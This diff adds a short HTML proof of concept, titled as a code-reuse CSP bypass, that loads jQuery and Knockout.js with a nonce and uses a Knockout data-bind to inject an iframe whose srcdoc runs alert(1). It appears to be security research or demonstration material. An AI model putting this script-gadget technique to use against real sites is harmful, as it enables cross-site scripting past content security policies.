@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSP Bypass(code-reused)</title>
+    <!-- <meta http-equiv=content-security-policy content="script-src 'nonce-secret123' 'unsafe-eval' 'strict-dynamic'; "> -->
+    <script nonce="secret123" src="https://code.jquery.com/jquery-3.1.1.js"></script>
+    <script nonce="secret123" src="http://knockoutjs.com/downloads/knockout-3.4.1.debug.js"></script>
+</head>
+
+<body>
+    <div data-bind="html:'<iframe srcdoc=&quot;<script>alert(1)</script>&quot;></iframe>'"></div>
+    <script nonce="secret123">
+        ko.applyBindings();
+    </script>
+</body>
+</body>
+
+</html>
